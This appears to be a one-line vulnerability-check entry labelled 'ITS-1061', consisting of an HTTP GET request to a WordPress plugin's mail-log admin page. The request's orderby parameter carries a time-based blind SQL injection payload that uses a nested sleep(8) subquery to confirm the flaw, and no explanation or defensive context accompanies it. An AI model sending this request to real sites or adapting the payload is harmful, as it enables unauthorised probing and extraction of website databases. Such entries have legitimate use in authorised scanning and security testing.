# Vulnerable: ITS-1061
GET /wp-admin/admin.php?page=wp-mailplus-logs&orderby=sent_time%2c(select*from(select(sleep(8)))a)&order=asc
